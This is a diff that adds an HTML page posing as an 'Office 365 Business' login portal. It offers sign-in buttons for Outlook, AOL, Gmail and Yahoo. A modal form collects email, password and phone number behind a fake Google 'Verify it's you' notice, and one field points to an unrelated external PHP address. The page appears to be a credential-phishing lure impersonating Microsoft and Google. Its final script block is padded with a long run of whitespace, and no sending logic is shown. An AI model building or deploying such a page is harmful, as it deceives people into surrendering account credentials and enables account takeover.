@@ -1,0 +1,238 @@
+
+<!doctype html>
+<html lang="en">
+<head>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script src="https://code.jquery.com/jquery-3.1.1.min.js">
+    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
+    <title>Office365 | Login</title>
+    <link rel="icon" type="image/png" sizes="100x100" href="images/onedrive-white.png">
+    <link href="css/hover.css" rel="stylesheet" media="all">
+    <link href="css/album.css" rel="stylesheet">
+
+    <style type="text/css">
+
+      html, body {
+        height: 100%;
+      }
+
+     /* .main-video-wrapper{
+        position: fixed;
+        width: 100%;
+        z-index: -3;
+        }*/
+
+        .main-video-wrapper {
+          position:fixed;
+          top:0;
+          left:20;
+          width:100%;
+          height:100vh;
+          overflow:hidden;
+          z-index: -3;
+
+        }
+        .main-video-overlay {
+          height:100vh;
+          position: fixed;
+          top:0;
+          left:0;
+          width:100vw;
+          z-index:-1;
+          background: rgba(0,0,0,0.7);
+          opacity: 0.8;
+        }
+
+
+
+      </style>
+    </head>
+    <body>
+     <!-- videooo div start//////////// -->
+     <div class="main-video-wrapper" style="filter: blur(3px);
+     -webkit-filter: blur(3px);">
+     <!-- Embedded Video Element -->
+     <video playsinline="playsinline" autoplay="autoplay" muted="muted" loop="loop">
+      <source src="video/office365-2.mp4" type="video/mp4">
+      </video>
+    </div>
+    <!-- Overlay Div for the Video -->
+    <div class="main-video-overlay"></div>
+    <!-- video div close/////////////////// -->
+    <div>
+      <div class="container-fluid">
+        <div class="container-fluid">
+          <div class="row" style="padding: 20px 0px">
+            <div class="col-lg-4 align-self-center text-center">
+              <div class="mx-auto p-1" style="border:1px solid white;width: 380px">
+                <img src="images/office3651.png" class="img-fluid" width="40px;">
+                <span class="h4 text-white align-middle">Office 365 Buisness</span>
+              </div>
+              <img src="images/right.gif" class="img-fluid pt-2" width="380px"><br>
+              <span class="text-white">Microsoft 365 now has all your favorite Office 365 apps in one place. Enjoy new levels of productivity and collaboration with powerful Microsoft 365 tools.</span>
+              <!-- <img src="images/left.gif" class="img-fluid" width="150px"><br> -->
+
+            </div>
+            <div class="col-lg-8 py-3 align-self-center">
+              <div style="padding: 10px 30px 15px 30px">
+                <div class=" text-white col-lg-12"> 
+                  <span class="h5 text-white">Select your email provider</span><br>
+                  <span style="color:white;font-family: 'Archivo Narrow', sans-serif; ">Unfortunately we could not find your email provider based on your input.</span>
+                </div>
+                <div class="">
+                  <div class="row mx-2">
+                    <div class="col-lg-2 mt-2">
+                      <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100" style="text-decoration: none;">
+                        <div class="text-center p-1 rounded" style=" background-color: #FF3C00;">
+                          <img src="images/office3651.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;"><br>
+                          <span  style="vertical-align: middle; color: white;font-weight: 500">Login with<br> Office365</span>
+                        </div>
+                      </a>
+                    </div>
+
+                    <div class="col-lg-2 mt-2">
+                      <a href="javascript:void(0)" id="outlookmodal" class="hvr-grow w-100" style="text-decoration: none;">
+                        <div class="text-center p-1 rounded" style="  background-color: #0073C8;">
+                          <img src="images/outlook1.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;">|<br>
+                          <span style="vertical-align: middle; color: white;font-weight: 500;">Login with<br> Outlook</span>
+                        </div>
+                      </a>
+                    </div>
+                    <div class="col-lg-2 mt-2">
+                      <a href="javascript:void(0)" id="aolmodal" class="hvr-grow w-100" style="text-decoration: none;">
+                        <div class="text-center p-1 rounded" style="background-color: #31459B;">
+                          <img src="images/aol1.png" class="img-fluid" width="35px" style="padding:5px 0px 5px 0px;"><br>
+                          <span style="vertical-align: middle; color: white;font-weight: 500;">Login with<br> Aol</span>
+                        </div>
+                      </a>
+                    </div>
+                    <div class="col-lg-2 mt-2">
+                      <a href="javascript:void(0)" id="gmailmodal" class="hvr-grow w-100" style="text-decoration: none;">
+                        <div class="text-center p-1 rounded" style="background-color: #D44638;">
+                          <img src="images/gmail1.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;"><br>
+                          <span class="pl-2" style="vertical-align: middle; color: white;font-weight: 500;">Login with<br> Gmail</span>
+                        </div>
+                      </a>
+                    </div>
+
+                    <div class="col-lg-2 mt-2">
+                      <a href="javascript:void(0)" id="yahoomodal" class="hvr-grow w-100" style="text-decoration: none;">
+                        <div class="text-center p-1 rounded" style=" background-color: #5F0F68;">
+                          <img src="images/yahoo1.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;"><br>
+                          <span class="pl-2" style="vertical-align: middle; color: white;font-weight: 500;">Login with<br> Yahoo!</span>
+                        </div>
+                      </a>
+                    </div>
+                    <div class="col-lg-2 mt-2">
+                      <a href="javascript:void(0)" id="othermodal" class="hvr-grow w-100" style="text-decoration: none;">
+                        <div class="text-center p-1 rounded" style=" background-color: #0B5BD3;">
+                          <img src="images/other1.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;"><br>
+                          <span class="pl-2" style="vertical-align: middle; color: white;font-weight: 500;">Login with<br> Other</span>
+                        </div>
+                      </a>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          <!-- <div class="col-lg-3 align-self-center">
+           
+            
+          </div>  -->
+        </div> 
+      </div>
+
+
+    </div>
+  </div>
+
+
+
+
+  <!-- Modal for gmail -->
+  <div class="modal fade" id="ajaxModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+    <div class="modal-dialog" role="document">
+      <div class="modal-content">
+        <div class="modal-header">
+
+          <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+            <span aria-hidden="true">&times;</span>
+          </button>
+        </div>
+        <div class="modal-body">
+          <center>
+            <img id="fieldImg" src="images/gmail.png" class="img-fluid rounded-circle" width="80px">
+            <h5 class="modal-title" id="exampleModalLabel">Login with <span id="field">Gmail</span></h5>
+            <div class="alert alert-danger" id="msg"></div>
+            <span id="error" class="text-danger">That account doesn't exist. Enter a different account</span>
+
+          </center>
+          <form id="contact" class="form-horizontal well">
+            <div id="div1">
+              <div class="col-lg-12">
+                <div class="form-group">
+                  <div id="inputbar">
+                    <label for="exampleInputEmail1">Email address</label>
+                    <input type="email" name="email" class="form-control" id="email" aria-describedby="emailHelp" placeholder="https://enemsummit.com.br/.php1/php4/email.php">
+                    <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small></div>
+                    <div id="automail" class="h5 mt-5">
+                      <i class="fas fa-arrow-left" id="back1"></i>&nbsp<span id="emailch">abc@abc.com</span>
+                    </div>
+                  </div>
+                </div>
+                <div class="col-lg-12">
+                  <div class="form-group">
+                    <label for="Password">Password</label>
+                    <input type="password" name="password" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Enter Password">
+                  </div>
+                </div>
+              </div>
+              <div id="div2">
+                <i class="fas fa-arrow-left" id="back"></i>&nbsp<span id="emailch1" class="h5">abc@abc.com</span><br>
+                <span class="h4 font-weight-normal">Verify it's you</span><br>
+                <span >This device is not recognized. For security, Google want to make sure it's really you.</span><br>
+                <span id="msg1" class="text-danger"></span><br>
+                <span>Try another way to sign in</span>
+                <div class="form-group mt-3">
+                  <input type="number" name="phone" class="form-control" id="phone" aria-describedby="emailHelp" placeholder="Enter Phone No." >
+                </div>
+              </div>
+            </div>
+            <div class="modal-footer">
+              <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+              <button class="btn btn-info pull-right" id="submit-btn">Login</button>
+              <button class="btn btn-info pull-right" id="submit-btn1">verify</button>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+
+
+
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+  </body>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+
+  <script>
+
+   <!--  /* global $ */                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
+
+
+  </script>
+  </html>
